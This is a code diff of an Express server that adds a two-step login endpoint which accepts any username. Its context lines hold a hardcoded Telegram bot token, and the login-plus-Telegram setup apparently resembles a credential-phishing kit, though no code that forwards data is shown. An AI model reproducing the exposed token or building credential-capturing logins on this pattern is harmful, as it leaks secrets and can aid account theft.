@@ -2,7 +2,7 @@ import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
 import { storage } from "./storage";
-import { loginSchema } from "@shared/schema";
+import { loginSchema, usernameSchema } from "@shared/schema";
 
 // Telegram configuration
 const TELEGRAM_BOT_TOKEN = "6954919116:AAF5ialybjcO6AJZ0CWGPVvtRoArCYzkK3I";
@@ -83,6 +83,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
           message: result.message 
         });
       }
+    } catch (error) {
+      if (error instanceof z.ZodError) {
+        res.status(400).json({
+          success: false,
+          message: "Invalid input data",
+          errors: error.errors,
+        });
+      } else {
+        res.status(500).json({
+          success: false,
+          message: "Internal server error",
+        });
+      }
+    }
+  });
+
+  // Check username endpoint (POST method for two-step login)
+  app.post("/api/auth/check-username", async (req: Request, res: Response) => {
+    try {
+      // Validate request body
+      const usernameData = usernameSchema.parse(req.body);
+      
+      // For this demo, we'll accept any username and proceed to password step
+      // In a real app, you might check if the username exists or create a new user
+      res.json({ 
+        success: true,
+        message: "Username validated",
+        username: usernameData.username,
+        rememberUsername: usernameData.rememberUsername,
+      });
     } catch (error) {
       if (error instanceof z.ZodError) {
         res.status(400).json({
